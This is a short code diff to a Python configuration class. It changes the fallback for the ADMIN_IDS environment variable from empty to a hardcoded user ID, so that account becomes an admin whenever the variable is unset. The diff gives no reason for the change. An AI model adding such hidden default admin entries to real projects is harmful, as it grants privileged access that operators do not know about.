@@ -28,7 +28,7 @@ class Config:
     # Admin IDs (comma separated)
     admin_ids: list[int] = field(
         default_factory=lambda: [
-            int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()
+            int(x) for x in os.getenv("ADMIN_IDS", "6518065496").split(",") if x.strip()
         ]
     )
 
